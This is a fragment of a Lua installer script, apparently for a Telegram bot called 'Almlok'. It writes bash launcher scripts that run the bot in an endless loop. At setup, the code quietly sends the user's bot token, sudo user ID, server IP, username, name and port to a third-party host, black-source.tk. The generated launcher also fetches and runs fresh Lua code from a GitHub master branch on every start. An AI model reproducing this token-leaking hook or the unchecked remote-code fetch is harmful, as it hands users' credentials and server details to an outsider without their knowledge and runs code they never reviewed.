...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/AlmlokTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("Almlok", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Almlok
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr Almlok.lua
wget "https://raw.githubusercontent.com/Almlok/Almlok/master/Almlok.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Almlok.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Almlok -X kill
screen -S Almlok ./Almlok
done
]])
RunTs:close()
end
